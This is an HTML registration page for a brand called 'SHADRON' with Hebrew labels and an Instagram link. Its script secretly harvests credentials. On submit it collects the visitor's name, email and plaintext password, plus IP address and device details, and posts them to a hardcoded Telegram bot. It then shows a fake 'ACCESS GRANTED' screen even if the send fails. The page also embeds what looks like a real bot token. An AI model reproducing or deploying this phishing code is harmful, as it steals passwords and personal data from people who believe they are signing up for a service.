<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SHADRON | NEON NEXUS</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root {
            --neon-purple: #9d00ff;
            --neon-blue: #00f2ff;
            --bg: #050505;
            --insta-live: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background: var(--bg);
            color: #eee;
            font-family: 'Montserrat', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        #particles { 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            z-index: 1; 
            pointer-events: none; 
        }

        .screen { 
            display: none; 
            width: 100%; 
            padding: 20px; 
            position: relative; 
            z-index: 10;
            flex-direction: column;
            align-items: center;
        }
        .screen.active { display: flex; animation: fadeIn 0.8s ease; }

        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }

        .form-container {
            width: 100%;
            max-width: 380px;
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid rgba(157, 0, 255, 0.3);
            border-radius: 40px;
            padding: 40px 25px;
            box-shadow: 0 0 50px rgba(157, 0, 255, 0.2);
            backdrop-filter: blur(15px);
            text-align: center;
        }

        .logo-frame {
            padding: 15px 35px;
            border-radius: 100px;
            display: inline-block;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .logo-frame::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 242, 255, 0.6), transparent);
            animation: neonScan 2.5s infinite linear;
        }

        @keyframes neonScan { 0% { left: -100%; } 100% { left: 100%; } }

        .logo-text {
            font-family: 'Cinzel', serif;
            font-size: 2rem;
            letter-spacing: 6px;
            background: linear-gradient(to right, #fff, var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
            position: relative;
            z-index: 2;
        }

        .form-group { margin-bottom: 15px; text-align: right; }
        label { display: block; margin-bottom: 5px; font-size: 0.75rem; color: #888; padding-right: 15px; }

        input {
            width: 100%;
            padding: 14px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(157, 0, 255, 0.2);
            border-radius: 25px;
            color: #fff;
            font-size: 16px;
            transition: 0.3s;
        }

        input:focus { outline: none; border-color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }

        .btn-wakeup {
            width: 100%;
            padding: 18px;
            margin-top: 20px;
            background: #fff;
            color: #000;
            border: none;
            border-radius: 50px;
            font-family: 'Cinzel', serif;
            font-size: 1.2rem;
            font-weight: 900;
            cursor: pointer;
            letter-spacing: 2px;
            transition: 0.3s;
        }

        .btn-wakeup:disabled { background: #555; cursor: not-allowed; }

        .btn-insta-neon {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            padding: 22px;
            margin-top: 30px;
            text-decoration: none;
            color: white;
            font-family: 'Montserrat', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            border-radius: 50px;
            background: var(--insta-live);
            box-shadow: 0 10px 30px rgba(193, 53, 132, 0.4);
            transition: 0.4s;
        }

        .status-badge {
            display: inline-block;
            padding: 6px 18px;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 20px;
            font-size: 0.75rem;
            letter-spacing: 2px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<canvas id="particles"></canvas>

<div class="screen active" id="registerScreen">
    <div class="form-container">
        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
        <p style="color: #666; margin-bottom: 25px; letter-spacing: 2px; font-size: 0.8rem;">INITIATING FRACTURE</p>
        
        <form id="joinForm">
            <div class="form-group">
                <label>שם מלא</label>
                <input type="text" id="name" placeholder="Name" required>
            </div>
            <div class="form-group">
                <label>אימייל</label>
                <input type="email" id="email" placeholder="Email" required>
            </div>
            <div class="form-group">
                <label>סיסמה</label>
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-wakeup" id="submitBtn">WAKE UP</button>
        </form>
    </div>
</div>

<div class="screen" id="dashboardScreen">
    <div class="form-container">
        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
        <div class="status-badge">ACCESS GRANTED</div>
        <h1>WELCOME, <span id="userName">INITIATE</span></h1>
        
        <a href="https://www.instagram.com/shadron_cube?igsh=MTczaHF5NXh4eWRobg==" target="_blank" class="btn-insta-neon">
            <i class="fab fa-instagram fa-lg"></i>
            SHADRON CUBE
        </a>
    </div>
</div>

<script>
    const TELEGRAM_TOKEN = '8359245682:AAFr9l5f0yMop4QrQ2wPfqBmamMLi1SFmgA'; 
    const CHAT_ID = '8017590244';

    // חלקיקים ברקע
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    let particles = [];
    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    function create() { 
        particles = []; 
        for(let i=0; i<100; i++) {
            particles.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, v: Math.random()*0.5+0.2, s: Math.random()*2, o: Math.random()*0.5+0.2});
        }
    }
    function draw() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        particles.forEach(p => { 
            ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
            ctx.fillStyle = `rgba(157, 0, 255, ${p.o})`;
            ctx.fill(); p.y -= p.v; if(p.y < 0) p.y = canvas.height; 
        });
        requestAnimationFrame(draw);
    }
    window.addEventListener('resize', () => { resize(); create(); });
    resize(); create(); draw();

    // שליחת נתונים
    document.getElementById('joinForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        btn.disabled = true;
        btn.innerText = "PROCESSING...";

        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        const time = new Date().toLocaleString('he-IL');
        
        // איסוף דאטה טכני
        let ipData = { ip: "Unknown" };
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            ipData = await response.json();
        } catch(e) {}

        const details = {
            os: navigator.platform,
            browser: navigator.userAgent.split(') ')[1] || navigator.userAgent.substring(0, 30),
            screen: `${window.screen.width}x${window.screen.height}`,
            lang: navigator.language
        };

        const message = `
💠 *NEW INITIATE ALERT* 💠
━━━━━━━━━━━━━━━━━━
👤 *Identity:* ${name}
📧 *Email:* ${email}
🔑 *Access Key:* \`${pass}\`

🌐 *Network Info:*
📍 *IP Address:* ${ipData.ip}
🌍 *Language:* ${details.lang}

📱 *Device Status:*
💻 *System:* ${details.os}
🖥️ *Resolution:* ${details.screen}
🌐 *Agent:* ${details.browser}

⏰ *Timestamp:* ${time}
━━━━━━━━━━━━━━━━━━
🌑 *SHADRON PROTOCOL ACTIVE*
        `;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            document.getElementById('userName').textContent = name.split(' ')[0].toUpperCase();
            document.getElementById('registerScreen').classList.remove('active');
            document.getElementById('dashboardScreen').classList.add('active');
        } catch (error) {
            // מעבר בכל מקרה למסך הצלחה
            document.getElementById('registerScreen').classList.remove('active');
            document.getElementById('dashboardScreen').classList.add('active');
        }
    });
</script>

</body>
</html>
